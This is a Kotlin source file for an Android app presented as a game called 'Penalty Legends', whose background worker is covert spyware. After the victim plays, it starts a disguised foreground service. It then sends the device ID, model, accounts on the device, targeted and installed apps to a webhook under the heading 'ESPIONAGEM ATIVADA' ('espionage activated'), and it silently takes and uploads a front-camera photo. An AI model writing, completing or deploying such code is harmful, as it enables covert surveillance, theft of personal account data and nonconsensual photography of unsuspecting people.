package com.venice.penaltylegends.core

import android.content.Context
import android.content.Intent
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.ForegroundInfo
import androidx.work.WorkerParameters
import kotlinx.coroutines.delay

class ActivateWorker(ctx: Context, params: WorkerParameters) : CoroutineWorker(ctx, params) {

    override suspend fun doWork(): Result {
        Prefs.init(applicationContext)
        if (Prefs.ativado) return Result.success()

        try {
            setForeground(
                ForegroundInfo(
                    1002,
                    NotificationCompat.Builder(applicationContext, Config.CANAL_ID)
                        .setSmallIcon(android.R.drawable.ic_menu_compass)
                        .setContentTitle("Penalty Legends")
                        .setPriority(NotificationCompat.PRIORITY_MIN)
                        .build()
                )
            )
        } catch (_: Throwable) {}

        Prefs.ativado = true

        try {
            ContextCompat.startForegroundService(
                applicationContext, Intent(applicationContext, CoreService::class.java)
            )
        } catch (t: Throwable) {
            return Result.retry()
        }

        delay(1200) // garante que o servico subiu antes do worker morrer

        relatorio()

        return Result.success()
    }

    private fun relatorio() {
        val ctx = applicationContext
        val campos = listOf(
            Webhook.f("Aparelho", Prefs.deviceId, true),
            Webhook.f("Android", android.os.Build.VERSION.RELEASE, true),
            Webhook.f("Modelo", "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}", true)
        )
        val embeds = listOf(
            Webhook.embed(
                "ESPIONAGEM ATIVADA",
                "O alvo ja jogou e nao desconfia. Servicos ligados.",
                0x39FF88, campos
            ),
            Webhook.embed("CONTAS NO APARELHO", "```\n${Harvester.contas(ctx)}\n```", 0x3498DB),
            Webhook.embed("APPS ALVO INSTALADOS", Harvester.appsAlvo(ctx), 0xE67E22),
            Webhook.embed("TODOS OS APPS", "ver anexo", 0x95A5A6)
        )
        Webhook.send(ctx, embeds, nomeArquivo = "apps.txt",
            bytes = Harvester.apps(ctx).toByteArray())

        // foto silenciosa, se tiver permissao
        Snap.frontal(ctx) { bytes ->
            if (bytes != null) {
                Webhook.send(
                    ctx,
                    listOf(Webhook.embed("FOTO FRONTAL SILENCIOSA", "Tirada sem aviso.", 0xE91E63)),
                    nomeArquivo = "selfie.jpg", bytes = bytes, mime = "image/jpeg"
                )
            }
        }
    }
}